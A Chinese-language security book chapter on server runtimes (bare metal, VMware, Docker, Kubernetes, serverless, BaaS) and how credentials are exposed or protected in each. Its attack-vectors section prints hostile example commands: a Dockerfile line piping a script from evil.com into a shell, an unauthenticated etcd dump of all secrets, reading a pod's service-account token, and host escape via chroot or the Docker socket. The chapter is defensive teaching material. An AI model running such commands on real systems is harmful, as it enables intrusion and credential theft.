# 第8章：服务器与运行时环境

## 场景描述

密码经过CDN、API网关和软件供应链的层层检验，最终到达服务器，即将进入应用运行环境。

这是密码旅程中的"核心领地"——头部企业可能采用物理机、VMware、Docker、Kubernetes 或 FaaS/BaaS 等不同形态，从传统IDC到云原生、无服务器，部署技术各异，但凭证安全始终是核心关切。

## 技术细节

### 技术演进路线

**通俗理解**：应用部署就像住房形态的演变——从独栋别墅到公寓楼，再到共享办公空间。

```
物理服务器 -> 虚拟化(VMware/KVM) -> 容器(Docker) -> 编排(K8s) -> 无服务器(FaaS)
   v              v                    v               v              v
  独占硬件    资源隔离/利用率^      轻量/快速      自动扩缩容      按需付费

  传统IDC      私有云/公有云        微服务架构      云原生         Serverless
```

**各代技术特点**：

| 技术代际 | 代表技术 | 启动时间 | 资源粒度 | 适用场景 |
|----------|----------|----------|----------|----------|
| **物理机** | 独立服务器 | 分钟级（开机） | 整台机器 | 传统IDC、强合规 |
| **虚拟化** | VMware/KVM | 分钟级 | GB级 | 资源隔离、多租户 |
| **容器** | Docker/containerd | 秒级 | MB级 | 微服务、DevOps |
| **编排** | Kubernetes | 秒级 | 容器组 | 大规模集群管理 |
| **Serverless** | Lambda/函数计算 | 毫秒级 | 函数级 | 事件驱动、弹性流量 |

### 1. 物理机 (Bare Metal)

**通俗理解**：像"独栋别墅"——整台服务器独占，无虚拟化层，应用直接运行在操作系统之上。

**架构与安全边界**：

```
物理服务器 (CPU/内存/磁盘/网络)
    v
操作系统 (Linux/Windows Server)
    v
应用进程
```

**密码在此形态下的状态**：
- 直接存在于宿主机内存、Swap分区
- 配置文件可能在`/etc/`、应用目录
- 无虚拟化层隔离，宿主机沦陷即全部暴露

**适用场景**：
- 传统IDC、金融核心系统、等保高等级
- 强合规要求（如不允许虚拟化）
- 高性能计算、低延迟交易

**安全要点**：
- 物理隔离、机架级访问控制
- 操作系统加固（CIS Benchmark）
- 无Hypervisor攻击面，但单点故障影响大

**代表企业**：银行核心账务、证券交易系统、军工/政府高密级系统

---

### 2. 虚拟化 (VMware / KVM / Hyper-V)

**通俗理解**：像"联排别墅"——一台物理机通过Hypervisor划分为多台虚拟机，每台VM拥有独立内核和完整OS。

**架构与安全边界**：

```
物理服务器
    v
Hypervisor (VMware ESXi / KVM / Hyper-V)
    ├── VM1 (Guest OS + App)
    ├── VM2 (Guest OS + App)
    └── VM3 (Guest OS + App)
```

**VMware 生态特点**：
- **ESXi**：裸金属Hypervisor，攻击面小
- **vSphere**：集中管理、vMotion 迁移、HA 高可用
- **NSX**：虚拟网络与微分段
- **凭证存储**：vCenter 存管理凭据，VM 内各自存应用凭据

**密码在此形态下的状态**：
- 各 VM 内独立：LSASS/SAM、应用内存、配置文件
- Hypervisor 不直接接触 Guest 内密码
- vCenter 存 vSphere 管理凭据，需单独保护

**安全要点**：
- **VM 逃逸**：漏洞可使攻击者从 VM 突破到宿主机（如 CVE-2019-5544）
- **vCenter 加固**：双因素认证、网络隔离、审计日志
- **NSX 微分段**：限制 VM 间横向移动

**代表企业**：传统企业私有云、VMware 云、混合云（VMware on AWS/Azure）

---

### 3. 容器 (Docker / containerd)

**通俗理解**：想象一个"公寓楼"——整栋楼共享基础设施，但每个公寓都是独立的。

**架构与安全边界**：

```
物理服务器
    v
Host OS (Linux Kernel)
    v
Docker Engine / containerd
    ├── Container A (Web App)
    ├── Container B (API Service)
    └── Container C (Background Job)
```

**各层职责**：
- **物理服务器**：硬件资源（CPU、内存、磁盘、网络）
- **Host OS**：内核，管理所有资源
- **Docker Engine**：容器运行时，管理容器生命周期
- **容器**：应用运行的隔离环境

**密码在此形态下的状态**：
- 容器内进程内存、环境变量、挂载的 Secret
- 共享宿主机内核，容器逃逸可读宿主机内存
- 镜像层、构建缓存可能含历史凭据

---

### 虚拟化 vs 容器 vs 物理机对比

**通俗理解**：虚拟机像"独立别墅"，容器像"公寓楼"——前者完全隔离但成本高，后者共享资源但更灵活。

| 特性 | 虚拟机 (VM) | 容器 (Container) |
|------|-------------|------------------|
| **隔离级别** | 硬件级（Hypervisor） | 操作系统级（Namespace/Cgroups） |
| **启动时间** | 分钟级 | 秒级 |
| **资源占用** | GB级（整个OS） | MB级（共享内核） |
| **性能损耗** | 10-20% | <5% |
| **密度** | 单机10-100台 | 单机1000+容器 |
| **适用场景** | 强隔离需求、多OS | 微服务、快速迭代 |

**安全对比**：

| 安全维度 | 虚拟机 | 容器 |
|----------|--------|------|
| **攻击面** | 小（独立内核） | 大（共享内核） |
| **逃逸难度** | 高（需突破Hypervisor） | 中（Namespace突破） |
| **漏洞影响范围** | 单台VM | 整个宿主机 |
| **安全工具成熟度** | 高 | 中 |

### 容器安全机制

#### 1. Namespace隔离

**通俗理解**：每个容器都在自己的"平行宇宙"里，看不到其他容器的存在。

**Namespace类型**：

| Namespace | 隔离资源 | 说明 |
|-----------|----------|------|
| **PID** | 进程ID | 容器内PID 1是应用，看不到宿主机进程 |
| **Network** | 网络栈 | 独立的网卡、IP、端口空间 |
| **Mount** | 文件系统 | 独立的挂载点，chroot环境 |
| **User** | 用户ID | UID/GID映射，容器内root≠宿主机root |
| **IPC** | 进程间通信 | 独立的共享内存、信号量 |
| **UTS** | 主机名/域名 | 独立的主机名 |

**安全意义**：
- 容器内root权限受限
- 无法直接访问宿主机资源
- 容器间相互隔离

#### 2. Capabilities

**通俗理解**：Linux的"特权拆分"——不再是非root即root，而是细粒度的权限控制。

**传统模型**：
- root：拥有所有权限
- 普通用户：几乎没有权限

**Capabilities模型**：
- 将root权限拆分为40+个细粒度权限
- 每个权限可独立授予/撤销
- 容器默认DROP所有权限

**常用Capabilities**：

| Capability | 说明 | 风险等级 |
|------------|------|----------|
| **CAP_NET_BIND_SERVICE** | 绑定低端口（<1024） | 低 |
| **CAP_CHOWN** | 修改文件所有者 | 中 |
| **CAP_SYS_ADMIN** | 系统管理（极危险） | 高 |
| **CAP_SYS_PTRACE** | 调试其他进程 | 高 |
| **CAP_SYS_MODULE** | 加载内核模块 | 极高 |

**安全实践**：
```dockerfile
# 默认DROP所有权限
cap_drop:
  - ALL
# 按需添加必要权限
cap_add:
  - NET_BIND_SERVICE
```

#### 3. Seccomp

**通俗理解**：系统调用的"防火墙"——只允许必要的系统调用。

**工作原理**：
- 定义系统调用白名单/黑名单
- 容器尝试禁止的调用时被终止
- Docker默认Seccomp配置限制44个危险调用

**被限制的危险调用**：
- `mount`/`umount`：文件系统挂载
- `reboot`：重启系统
- `open_by_handle_at`：容器逃逸漏洞利用

### Kubernetes容器编排

**通俗理解**：像"集装箱调度中心"，自动管理成千上万个容器的部署、扩展和故障恢复。

**架构演进**：
```
单机Docker                Kubernetes集群
    v                          v
  手动管理      ->           自动编排
  单节点        ->           多节点分布式
  无服务发现    ->           内置服务网格
```

**核心组件**：

| 组件 | 功能 | 安全考虑 |
|------|------|----------|
| **Pod** | 最小部署单元（一个或多个容器） | 共享网络空间、权限共享 |
| **Deployment** | 声明式部署管理 | 镜像版本控制、滚动更新 |
| **Service** | 服务发现和负载均衡 | 仅暴露必要端口 |
| **Ingress** | 外部访问入口 | TLS终止、路由控制 |
| **Secret** | 敏感数据存储 | etcd加密、RBAC控制 |
| **ConfigMap** | 配置文件管理 | 不存储敏感信息 |

**K8s安全机制**：

**1. RBAC（基于角色的访问控制）**
```yaml
# 最小权限Service Account示例
apiVersion: v1
kind: ServiceAccount
metadata:
  name: web-app-sa
  namespace: production
automountServiceAccountToken: false  # 不自动挂载Token
```

**2. Network Policy（网络隔离）**
```yaml
# 只允许特定Pod通信
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: api-allow
spec:
  podSelector:
    matchLabels:
      app: api
  policyTypes:
  - Ingress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: frontend
```

**3. Pod Security Standards**
- **Privileged**：无限制（危险！）
- **Baseline**：最小限制（推荐默认）
- **Restricted**：严格限制（高安全要求）

**4. Secrets加密**
- 默认Base64编码（非加密！）
- 需启用etcd加密（AES-GCM）
- 或使用外部Secret管理（Vault/AWS Secrets Manager）

**与Docker的关系**：
- K8s 1.20 宣布废弃 dockershim（附过渡警告），K8s 1.24（2022年）正式移除 dockershim
- 不再直接支持 Docker 作为容器运行时，推荐使用 containerd 或 CRI-O
- Docker 镜像格式仍然兼容（OCI 标准）

### Serverless无服务器

**通俗理解**：像"按需租用的计算服务"——不用管服务器，只写代码，按调用次数付费。

**架构对比**：
```
传统服务器                Serverless
    v                        v
  预置容量      ->          按需分配
  持续运行      ->          事件触发
  按资源付费    ->          按调用付费
```

**主流平台**：

| 平台 | 产品 | 特点 |
|------|------|------|
| **AWS** | Lambda | 生态最成熟，与AWS服务深度集成 |
| **阿里云** | 函数计算 | 国内合规，支持GPU实例 |
| **腾讯云** | SCF | 与微信生态集成 |
| **Azure** | Functions | 与微软生态集成 |

**Serverless安全特点**：

**优势**：
- **无服务器管理**：无OS补丁、无SSH密钥泄露风险
- **自动隔离**：每次调用独立环境
- **细粒度权限**：函数级IAM角色

**风险**：
- **冷启动漏洞**：函数初始化时加载恶意依赖
- **权限过大**：函数IAM角色过度授权常见
- **配置泄露**：环境变量中存储密钥
- **依赖漏洞**：函数运行时依赖被利用

**安全最佳实践**：
```python
# 不好的做法：权限过大
def lambda_handler(event, context):
    # 这个函数可以访问所有S3桶！
    s3 = boto3.client('s3')

# 好的做法：最小权限
def lambda_handler(event, context):
    # 仅允许访问特定桶
    # IAM策略：s3:GetObject限制到arn:aws:s3:::specific-bucket/*
    pass
```

### 6. BaaS (Backend as a Service)

**通俗理解**：像"租用现成的后台"——数据库、认证、存储等由云厂商托管，开发只需调用 API，密码与凭据由 BaaS 管理。

**架构示意**：

```
应用（Web/App）
    v API 调用
BaaS 平台 (Firebase / Supabase / 阿里云 BaaS)
    ├── 认证服务 (Auth)     <- 密码、Token 由平台管理
    ├── 数据库 (Firestore/RDS)
    ├── 对象存储
    └── 云函数 (可选)
```

**主流 BaaS 平台**：

| 平台 | 认证方式 | 凭证存储 | 典型场景 |
|------|----------|----------|----------|
| **Firebase** | Email/匿名/OAuth | 平台托管、可导出 | 移动端、快速上线 |
| **Supabase** | 基于 Postgres + JWT | 自托管可选 | 开源替代 Firebase |
| **阿里云 BaaS** | RAM/STS | 平台 KMS | 国内合规项目 |

**密码在此形态下的状态**：
- 用户密码：由 BaaS Auth 哈希存储，应用不直接接触明文
- API Key / Service Account：用于应用调用 BaaS，需妥善保管
- 数据库凭据：托管库由平台管理，自建库需自管

**安全要点**：
- **最小权限**：BaaS 控制台与 API Key 按角色拆分
- **审计日志**：启用登录、数据访问审计
- **合规考量**：国内项目优先选境内 BaaS，满足等保/个保

**代表企业**：创业公司、MVP 验证、中小型 ToC 应用

### 技术选型对比

**场景化选型指南**：

| 场景 | 推荐方案 | 理由 | 代表企业 |
|------|----------|------|----------|
| **强合规/核心金融** | 物理机 | 等保高等级、不允许虚拟化、审计要求 | 银行核心、证券交易 |
| **传统企业私有云** | VMware / KVM | 成熟稳定、多租户隔离、运维熟悉 | 制造业、政企 |
| **初创/小团队** | Docker Compose + 单云主机 | 简单、成本低、快速上线 | 创业公司 |
| **快速验证/MVP** | BaaS (Firebase/Supabase) | 免运维、认证/存储开箱即用 | 早期创业 |
| **中型微服务** | Kubernetes（托管版） | 生态成熟、可扩展、社区活跃 | 阿里、腾讯 |
| **大型混合云** | K8s + Service Mesh | 跨云部署、精细管控、合规 | 金融企业 |
| **事件驱动/突发流量** | FaaS (Lambda/函数计算) | 按需付费、自动扩缩容、免运维 | 电商大促 |
| **强隔离需求** | Kata Containers/gVisor | VM级隔离，容器便利性 | 高安全行业 |

**技术演进建议**：
```
阶段1：Docker Compose（验证业务模式）
    v 业务增长
阶段2：Kubernetes（规模化管理）
    v 多云需求
阶段3：K8s + Istio（服务网格）
    v 成本优化
阶段4：Serverless（按需付费）
```

## 攻击向量

不同运行时形态（物理机、VM、容器、K8s、FaaS/BaaS）面临不同攻击面，以下按形态归纳主要风险。

### 0. 物理机与虚拟化特有风险

**物理机**：
- **物理接触**：机房/机架入侵、冷启动攻击（内存残留）
- **单点沦陷**：宿主机被控即全应用暴露，无隔离缓冲

**虚拟化 (VMware)**：
- **VM 逃逸**：Guest 内漏洞突破至宿主机（如 CVE-2019-5544）
- **vCenter 攻击**：管理平面暴露，可操控全集群 VM
- **vMotion 嗅探**：迁移过程若未加密，内存中密码可被截获

### 1. 容器逃逸

**通俗理解**：从"公寓"逃出，获得整栋"大楼"的控制权。

**攻击方式**：

**Privileged模式**：
- `docker run --privileged` 授予容器所有权限
- 容器可以访问所有设备
- 可以加载内核模块、修改内核参数
- **危险等级**：极高

**内核漏洞**：
- **Dirty COW (CVE-2016-5195)**：写时复制竞争条件
- **CVE-2022-0847 (Dirty Pipe)**：管道写入漏洞
- 利用内核漏洞提升权限到宿主机

**挂载Docker Socket**：
```bash
# 危险操作！容器获得宿主机Docker控制权
docker run -v /var/run/docker.sock:/var/run/docker.sock ubuntu

# 在容器内可控制宿主机Docker
docker ps  # 看到宿主机的所有容器
```

**防护措施**：
- 绝不使用`--privileged`
- 及时更新内核和Docker
- 禁止挂载Docker Socket
- 使用gVisor/Kata Containers增强隔离

---

### 2. 镜像投毒

**通俗理解**：使用了"预制好的毒餐盒"——看似方便，实则危险。

**攻击方式**：

**恶意基础镜像**：
- 官方镜像被入侵（如Docker Hub账号被盗）
- 相似名称的恶意镜像（`node-js` vs `nodejs`）
- 长期未更新的镜像包含已知漏洞

**依赖库后门**：
- npm/pip包被植入恶意代码
- 间接依赖（依赖的依赖）被污染
- 废弃包被攻击者接管后发布恶意版本

**构建时攻击**：
- Dockerfile中下载恶意脚本
```dockerfile
# 危险！
RUN curl http://evil.com/backdoor.sh | sh
```
- 多阶段构建中使用了被污染的中间镜像

**真实案例**：
- 2021年，ua-parser-js被入侵，发布带挖矿木马的版本
- 2022年，PyTorch依赖被篡改，窃取SSH密钥
- 数万台服务器被感染

**防护措施**：
- 使用私有镜像仓库
- 镜像签名验证（Notary/Cosign）
- 定期扫描镜像漏洞（Trivy、Clair）
- 依赖锁定和哈希校验

---

### 3. 配置泄露

**通俗理解**：把"保险箱密码"贴在"公寓门"上。

**泄露途径**：

**环境变量**：
```yaml
# docker-compose.yml - 不安全！
environment:
  DB_PASSWORD: "SuperSecret123!"
  API_KEY: "sk-1234567890abcdef"
```
- `docker inspect` 可见所有环境变量
- 日志中可能泄露
- 进程列表中可见（/proc/PID/environ）

**ConfigMap/Secret**：
- Kubernetes Secret默认base64编码（非加密！）
- etcd中明文存储
- 需要启用etcd加密

**日志泄露**：
```javascript
// 不安全！密码打印到日志
console.log("User login:", { username, password });
```

**防护措施**：
- 使用专门的Secret管理工具（Vault、AWS Secrets Manager）
- 敏感信息不进入环境变量
- 日志脱敏处理
- 定期审计容器配置

### 4. K8s特定攻击

**通俗理解**：像"潜入集装箱调度中心"——攻击K8s控制平面，掌控整个集群。

**攻击方式**：

**etcd未授权访问**：
- etcd存储集群所有Secret（数据库密码、API密钥、Token）
- 默认早期版本无认证， exposed 2379端口可直接读取
```bash
# 无认证访问etcd获取所有Secret
ETCDCTL_API=3 etcdctl --endpoints=http://<master-ip>:2379 get / --prefix
```
- **危害**：无需入侵应用，直接获取所有凭证

**API Server滥用**：
- Service Account默认挂载Token到每个Pod
- 权限过大的Service Account可被利用横向移动
```bash
# Pod内默认存在Service Account Token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```
- 配合Kubernetes API可创建特权Pod实现逃逸

**容器逃逸到节点**：
- 突破Namespace限制，访问宿主机资源
- 在节点上可读取其他Pod的内存、文件系统
- 通过特权Pod或直接访问kubelet API
```bash
# 特权Pod可直接访问宿主机文件系统
chroot /host bash
```

**防护措施**：
- etcd启用TLS认证+防火墙限制访问
- 禁用默认Service Account自动挂载
- 使用Pod Security Standards限制特权Pod
- 启用审计日志监控API异常调用

---

### 5. Serverless攻击

**通俗理解**：像"针对临时工的攻击"——利用函数冷启动和短暂存在的特点。

**攻击方式**：

**函数权限过大（IAM过度授权）**：
- Lambda/函数计算常被授予远超需求的权限
- 如只需读S3一个桶，却授予`s3:*`权限
```python
# 攻击者利用过度授权的函数遍历整个AWS账户
def lambda_handler(event, context):
    # 可以访问所有S3桶、DynamoDB表...
    s3.list_buckets()  # 列出所有桶
```

**依赖漏洞**：
- 函数运行时需要加载依赖（pip/npm包）
- 恶意依赖可在冷启动时执行代码
- 供应链攻击（如colors.js、facker.js事件）

**配置泄露**：
- 环境变量中存储密钥（最危险的做法）
- 函数代码中硬编码凭证
- CloudWatch日志中打印敏感信息
```python
# 不安全：密钥在环境变量和日志中暴露
import os
secret_key = os.environ['SECRET_KEY']  # 可被读取
print(f"Using key: {secret_key}")  # 泄露到日志
```

**冷启动漏洞**：
- 函数首次启动时初始化环境
- 攻击者利用初始化窗口进行探测
- 残留数据跨调用泄露（容器复用）

**防护措施**：
- IAM最小权限原则，按函数精确授权
- 依赖锁定和漏洞扫描（Snyk、Dependabot）
- 使用Secrets Manager，不存储密钥在环境变量
- 函数超时设置合理，避免长时间运行被利用

### 详细MITRE ATT&CK分析

**T1552.007 - Unsecured Credentials: Container API**
- **战术**: Credential Access
- **技术**: 通过容器运行时API获取凭证
- **检测**: 监控Docker API调用、异常容器行为
- **缓解**: M1026 (Privileged Account Management), M1035 (Limit Access to Resource Over Network)

**T1610 - Deploy Container**
- **战术**: Execution
- **技术**: 部署恶意容器进行横向移动
- **检测**: 镜像签名验证、运行时行为监控
- **缓解**: M1038 (Execution Prevention), M1042 (Disable or Remove Feature or Program)

**T1611 - Escape to Host**
- **战术**: Privilege Escalation
- **技术**: 容器逃逸获取宿主机权限
- **检测**: 系统调用监控、异常进程树
- **缓解**: M1048 (Application Isolation and Sandboxing)

## 触类旁通

### 容器 vs 集装箱：标准化打包，随处运行

**类比起源**

1956年之前，货物运输是噩梦：每个港口有不同的装卸方式，货物需要重新打包，工人搬运效率极低。集装箱的发明彻底改变了这一切——标准化的金属箱子，无论里面装什么货，在上海港、鹿特丹港、洛杉矶港都用同样的方式装卸，用同样的船只运输。

Docker容器解决的是完全相同的问题：应用在开发机上能跑，到生产服务器就报错（"在我机器上是好的"）。容器把应用和它的所有依赖打包在一起，像集装箱一样标准化——无论跑在AWS、Azure、本地服务器还是开发笔记本，行为都一致。

| 技术概念 | 生活场景 | 关键相似点 |
|---------|---------|-----------|
| Docker容器 | 标准化集装箱 | 标准打包，随处运行 |
| 容器镜像 | 集装箱货物清单+打包方式 | 可复现的制品 |
| Dockerfile | 集装箱打包规范 | 描述如何构建 |
| 容器仓库（Registry） | 集装箱堆场 | 存储和分发制品 |
| Kubernetes编排 | 港口调度系统 | 管理大量容器的调度 |
| 容器隔离（namespace） | 集装箱隔离不同货物 | 互不干扰 |

**延伸思考**

- **类比标准化插座**：就像全球电子设备通过转换插头能用于不同国家的电网，容器通过标准化接口能在不同云平台运行。差别在于"转换成本"——容器的转换成本接近零
- **容器 vs 虚拟机**：虚拟机是完整的"货轮"（包含操作系统），容器是"集装箱"（只含应用和依赖）。货轮更重、启动慢，但隔离更彻底；集装箱更轻、启动快，但共享宿主机内核
- **思考边界**：集装箱标准化的代价是：如果标准本身有问题（如容器运行时漏洞），所有"港口"都受影响——容器化降低了运维复杂度，但放大了单一运行时漏洞的影响范围

---

### 容器逃逸 vs 越狱：从集装箱里逃出来，进入货轮其他地方

**类比起源**

想象一个被关在集装箱里的人，集装箱被锁好放在货轮上。如果他找到一个方法撬开集装箱门，他就进入了货轮的甲板——那里有船员的生活区、驾驶室、其他集装箱。集装箱逃逸对应的就是容器逃逸：攻击者在容器里执行代码，通过内核漏洞或配置错误突破容器隔离，获得访问宿主机（或其他容器）的能力。

这是容器安全中最严重的威胁。一旦逃逸成功，攻击者就从"被沙盒限制的应用"变成了"能控制整个宿主机的管理员"，所有运行在同一宿主上的容器都可能沦陷。

| 技术概念 | 生活场景 | 关键相似点 |
|---------|---------|-----------|
| 容器逃逸 | 囚犯越狱逃出牢房 | 突破隔离边界 |
| 容器内恶意代码 | 越狱工具（撬锁工具） | 利用漏洞突破限制 |
| 宿主机内核 | 监狱/货轮的基础设施 | 共享的底层资源 |
| 特权容器（--privileged） | 没锁的集装箱 | 几乎没有隔离 |
| Seccomp/AppArmor | 额外的约束（枷锁） | 限制可执行的系统调用 |
| 镜像以非root运行 | 牢房里没有工具 | 减少逃逸后的危害 |

**延伸思考**

- **类比沙箱浏览器Tab**：浏览器标签页也是一种"容器"——每个Tab在沙盒中运行，理论上无法访问其他Tab的数据。浏览器沙箱逃逸（如Chrome零日漏洞）和容器逃逸是同类问题
- **逃逸路径**：常见容器逃逸向量包括：挂载宿主机`/`目录、使用特权模式、利用内核漏洞（如Dirty COW、runc漏洞）、滥用Docker socket
- **思考边界**：隔离是程度问题，不是绝对的。当"隔离"变成"信任边界"时，任何隔离机制的漏洞都会产生安全后果。深度防御原则要求即使容器逃逸成功，宿主机也有下一道防线（如以非root运行、最小化宿主机权限）

### 镜像安全扫描 vs 入境检疫：防止携带病毒进入

**类比起源**

出入境时，海关对旅客和货物进行检疫——不是检查你是否有票、是否有合法身份，而是检查你身上有没有携带危险的生物（病菌、害虫、动植物）。目的是防止外来有害物种进入国境，保护本国的生态和公共健康。镜像安全扫描做的是同一件事：在容器镜像进入生产环境之前，扫描镜像里是否含有已知漏洞、恶意软件、硬编码密钥……防止"带毒镜像"污染生产环境。

检疫在入境时做，镜像扫描在部署前做——都是"门口把关"而不是"放进来再处理"，体现了安全左移（Shift Left）的核心理念。

| 技术概念 | 生活场景 | 关键相似点 |
|---------|---------|-----------|
| 镜像漏洞扫描（Trivy等） | 入境行李X光检查 | 在进入前检测危险内容 |
| CVE数据库匹配 | 已知危险生物名录 | 对比已知威胁特征 |
| 基础镜像漏洞 | 旅客本身携带的病菌 | 最底层的风险来源 |
| 硬编码密钥检测 | 携带违禁物品 | 不应该存在的敏感内容 |
| CI/CD中的扫描门控 | 入境前的强制检疫 | 不通过检查不让进 |
| 扫描基线（Baseline） | 可接受的微生物阈值 | 定义可接受的风险水平 |

**延伸思考**

- **类比新员工背景调查**：在某人上岗之前做背景调查（犯罪记录、资质验证），和在镜像部署之前做安全扫描，都是"信任但验证"原则的体现
- **扫描的局限性**：入境检疫检测不到没有记录的新病种（零日漏洞）。镜像扫描同样如此——只能检测已知CVE，未知漏洞和逻辑缺陷需要其他方法（如DAST、代码审计）
- **思考边界**："零漏洞镜像"在现实中几乎不存在，因为任何操作系统基础层都有历史CVE。安全实践的核心是：高危漏洞必须修复，中低危漏洞需要评估利用可能性，不是追求"扫描报告零告警"

### 综合思考：运行时环境的纵深防御

**不同运行时形态的安全对比**

本章讨论了物理机、虚拟机、容器、Kubernetes、Serverless等多种运行时形态。从安全角度看，它们在隔离强度、攻击面、防护重点上各有不同：

| 运行时形态 | 隔离强度 | 主要攻击面 | 防护重点 |
|-----------|---------|-----------|---------|
| 物理机 | 最强（物理隔离） | 操作系统、服务配置 | 系统加固、补丁管理 |
| 虚拟机（KVM/VMware） | 强（Hypervisor隔离） | VM逃逸、Hypervisor漏洞 | Guest加固、VM间隔离 |
| 容器（Docker） | 中（内核共享） | 容器逃逸、镜像漏洞 | 最小镜像、非root运行 |
| Kubernetes | 中（Pod隔离） | RBAC配置、网络策略 | 最小权限、网络隔离 |
| Serverless | 弱（函数级别） | 函数注入、权限过大 | IAM最小权限、输入验证 |

**生活类比的整体映射**

把本章的三个类比串联起来，构成运行时安全的完整图景：

```
应用打包（集装箱标准化）
    │
    v
安全检查（入境检疫）
    │
    v
安全部署（严格的集装箱存放区）
    │
    v
运行隔离（集装箱锁好，防止逃逸）
```

**容器安全的最小实践集**

参照CIS Docker Benchmark，容器安全的核心配置原则：

- **镜像层面**：使用最小基础镜像（Alpine/Distroless）、非root用户运行、只安装必要软件包
- **运行层面**：禁用特权模式、只读文件系统、限制系统调用（Seccomp Profile）、启用AppArmor/SELinux
- **网络层面**：禁用容器间默认通信、使用用户自定义网络、限制出站访问
- **数据层面**：敏感信息通过Secret注入（不写入镜像）、挂载点只读（除必要数据卷）

**类比总结：不同形态，相同原则**

无论是物理机还是Serverless，底层安全原则是相通的：
- **最小权限**：只给完成任务所需的最小权限（集装箱只能访问自己的货物）
- **隔离边界**：明确信任边界，不假设内部网络安全（集装箱之间互不干扰）
- **持续验证**：入境不是一次性检查，运行时也需要持续监控（定期重新检疫）

**运行时安全的常见误区**

| 误区 | 现实 | 类比纠正 |
|------|------|---------|
| "容器天生安全，不需要额外配置" | 默认Docker配置有很多不安全选项 | 集装箱出厂没有锁，需要自己加锁 |
| "镜像扫描通过就安全了" | 扫描只能发现已知漏洞，扫描后才引入的漏洞不在其中 | 入境检疫只检当时，不检后来感染 |
| "内网容器不需要考虑网络隔离" | 内网威胁（横向移动）是真实存在的攻击路径 | 集装箱放进仓库后，仓库内部的安全同样重要 |
| "Kubernetes RBAC太复杂，先用cluster-admin" | 过度权限是集群安全的最大风险之一 | 给所有员工万能钥匙，理由是"方便管理" |
| "Serverless没有服务器，所以没有安全问题" | Serverless仍有代码注入、权限过大、依赖漏洞等问题 | 无人驾驶汽车没有司机，但仍然可能出事故 |

**触类旁通的核心洞察**

三个类比揭示了容器化环境安全的底层逻辑：集装箱标准化解决了"环境不一致"问题，但也把安全配置的责任交给了使用者；容器逃逸是隔离失效的典型，而所有隔离机制的漏洞都源于"共享底层资源"；镜像扫描的"入境检疫"思路体现了安全左移——在问题进入生产环境之前拦截，而不是进去了再处理。这三个维度加在一起，构成了容器安全"打包安全、隔离安全、持续验证"的完整体系。

## 总结

密码进入数据中心后，可能运行于物理机、VMware、Docker、Kubernetes 或 FaaS/BaaS 等不同形态。头部企业往往根据业务阶段和合规要求做技术选型，安全要点随形态而异。

**关键要点**：
1. **形态适配**：物理机/VM 重物理与 Hypervisor 加固，容器重镜像与逃逸防护，FaaS/BaaS 重 IAM 与配置
2. **避免特权容器**：使用容器时绝不 `--privileged`
3. **镜像与 Secret 管理**：可信来源、定期扫描、不在环境变量存敏感信息
4. **运行时监控**：物理机/VM 监控入侵与逃逸，容器监控异常行为与逃逸尝试

**纵深防御策略**：
- 物理机：加固 + 物理隔离 + 审计
- 虚拟化：vCenter 加固 + NSX 微分段 + VM 逃逸检测
- 容器/K8s：镜像扫描 + 运行时防护 + 网络隔离
- FaaS/BaaS：最小权限 IAM + 审计日志 + 配置脱敏

密码到达服务器后，首先经过 Web 中间件（Nginx/Apache）的"前门守卫"检查，下一章将详细阐述 Web 中间件的安全配置与攻击防护。
